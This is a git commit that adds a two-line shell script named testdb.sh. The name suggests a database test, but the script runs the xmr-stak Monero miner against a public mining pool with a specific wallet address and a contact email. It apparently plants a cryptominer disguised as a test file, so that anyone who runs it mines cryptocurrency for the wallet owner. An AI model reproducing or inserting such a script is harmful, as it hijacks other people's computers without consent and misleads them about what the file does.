2d0edbb0c70f767afa6f40903d7be7fe78a7eb9d
imdivyeshc <46047615+imdivyeshc@users.noreply.github.com>
2019-08-28 12:58:52 +0530

    Create testdb.sh

---
+++ testdb.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+./xmr-stak --url pool.supportxmr.com:7777 --user 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvsnMkhUcbG1d2aVMd --pass k80gc:dbdon@protonmail.com --currency cryptonight_r --rigid x
